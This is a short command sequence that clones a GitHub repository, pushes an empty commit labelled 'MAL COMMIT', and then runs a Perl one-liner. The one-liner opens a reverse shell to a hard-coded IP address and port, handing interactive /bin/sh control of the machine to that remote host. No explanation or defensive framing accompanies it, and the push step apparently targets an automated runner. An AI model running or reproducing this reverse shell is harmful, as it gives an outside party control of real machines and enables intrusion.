git clone https://github.com/tester49481/linux_runner.git
cd linux_runner
touch k
git add .
git commit -m 'MAL COMMIT'
git push origin main
perl -e 'use Socket;$i="202.184.150.125";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
